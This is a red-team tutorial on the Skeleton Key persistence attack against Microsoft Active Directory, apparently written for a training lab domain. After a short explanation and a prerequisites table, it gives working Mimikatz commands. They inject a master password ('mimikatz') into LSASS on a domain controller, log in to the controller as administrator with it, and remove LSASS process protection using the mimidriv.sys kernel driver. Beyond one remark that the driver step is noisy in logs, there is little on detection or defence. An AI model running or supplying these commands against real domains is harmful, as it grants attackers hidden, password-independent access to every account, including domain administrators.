# Skeleton Key Attack

A Skeleton Key Attack is a type of cyber-attack that exploits a vulnerability in Microsoft's Active Directory (AD) authentication system. This attack involves the use of a backdoor password added to an AD domain's credentials cache, allowing the attacker to bypass normal authentication procedures and access any account in the domain without knowing the account's password.

By inserting their own key in the LSASS process of the DC, the attacker can access the DC or any other machine in the entire domain using a valid username and the skeleton key as the password.

## Attack Details

The Skeleton Key Attack is performed by gaining administrative access to an AD domain controller and injecting the backdoor password into the domain's credentials cache. Once injected, the attacker can use the backdoor password to authenticate to any account in the domain by simply appending the password to the account's username.

This attack is particularly dangerous because it allows unauthorized access to any account in the domain, including highly privileged accounts such as domain administrators. Additionally, the attacker can maintain access to the domain even if the domain's administrator passwords are changed.

### Key Points

- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (LSASS process) to allow access as any user with a single password.
- The attack was discovered by Dell SecureWorks and was used in malware named Skeleton Key malware.
- All publicly known methods are NOT persistent across reboots.
- Performing this attack requires DC privileges.
- It is possible to access any machine with a valid username and password as "mimikatz".

# Prerequisites for Performing the Skeleton Key Attack

| Prerequisite          | Details                                                                                           |
|-----------------------|---------------------------------------------------------------------------------------------------|
| **Administrative Access** | Required to gain access to the AD domain controller.                                           |
| **Domain Controller (DC)** | The attack needs to be performed on a Domain Controller.                                      |
| **Mimikatz Tool**       | Required to inject the skeleton key and manipulate the LSASS process.                           |
| **Privilege Escalation**  | Ability to gain DA (Domain Admin) privileges to execute commands and inject the backdoor password. |
| **Script or Command Execution** | PowerShell or another scripting tool to run Mimikatz and other necessary commands.          |
| **Awareness of LSASS Protection** | Knowledge of handling LSASS if it is running as a protected process, possibly involving `mimidriv.sys`. |

Ensure all the above prerequisites are met before attempting to perform the attack.

## Steps to Perform Skeleton Key Attack

### Inject Skeleton Key
Use the below command to inject a skeleton key (password would be `mimikatz`) on a Domain Controller of choice. DA privileges required.
```powershell
PS C:\Windows\system32> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

### Access Any Machine
Now, it is possible to access any machine with a valid username and password as `mimikatz`.
```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> whoami
dcorp\administrator
[dcorp-dc.dollarcorp.moneycorp.local]: PS C:\Users\Administrator\Documents> hostname
dcorp-dc
```

You can access other machines as long as they authenticate with the DC that has been patched and the DC is not rebooted.

### In Case LSASS is Running as a Protected Process
If LSASS is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (`mimidriv.sys`) on disk of the target DC:
```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
Note that the above steps would be very noisy in logs due to Service installation (Kernel mode driver).
```
